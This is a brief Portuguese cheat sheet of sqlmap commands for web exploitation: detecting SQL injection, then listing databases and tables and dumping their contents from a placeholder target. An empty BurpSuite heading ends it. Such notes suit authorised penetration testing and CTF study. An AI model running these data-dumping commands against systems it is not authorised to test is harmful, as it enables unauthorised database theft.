# Web Exploitation

## SQLMap

Automação de SQL Injection:

 - Verificar vulnerabilidade e listar Bancos de Dados
   ```
   sqlmap -u "[http://<ip>/]" --data="search=1337*&submit=" --dbs --random-agent -v 2
   ```
 - Listar tabelas
   ```
   sqlmap -u "..." --data="..." -D nome_do_db --tables --random-agent
   ```
 - Dump (extrair dados)
   ```
   sqlmap -u "..." --data="..." -D nome_do_db -T nome_da_tabela --dump
   ```
 - Wizard (Modo interativo simplificado)
   ```
   sqlmap --wizard
   ```

##BurpSuite





